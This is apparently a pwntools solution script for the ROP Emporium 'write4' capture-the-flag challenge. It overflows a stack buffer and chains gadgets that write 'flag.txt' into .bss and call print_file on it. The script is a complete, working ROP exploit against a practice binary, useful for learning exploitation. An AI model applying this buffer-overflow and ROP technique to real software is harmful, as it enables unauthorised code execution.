from pwn import *

elf = ELF('../write4/write4')

p = process('../write4/write4')
# context.terminal = ["tmux", "splitw"]
# p = gdb.debug('../write4/write4')
p.recvuntil(b'> ')


def write_qword(address, content):
    # mov qword ptr [r14], r15 ; ret
    mov_ret = 0x400628
    pop_r14_r15_ret = 0x400690
    payload  = p64(pop_r14_r15_ret)
    payload += p64(address)
    payload += content + (8 - len(content)) * b'\x00'
    payload += p64(mov_ret)
    return payload


print_file = elf.symbols['print_file']
location   = elf.bss()

rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]


junk = b'A' * 0x20 + b'A' * 0x8
payload  = junk
payload += write_qword(location, b'flag.txt')
payload += p64(pop_rdi_ret)
payload += p64(location)
payload += p64(print_file)

p.sendline(payload)
p.interactive()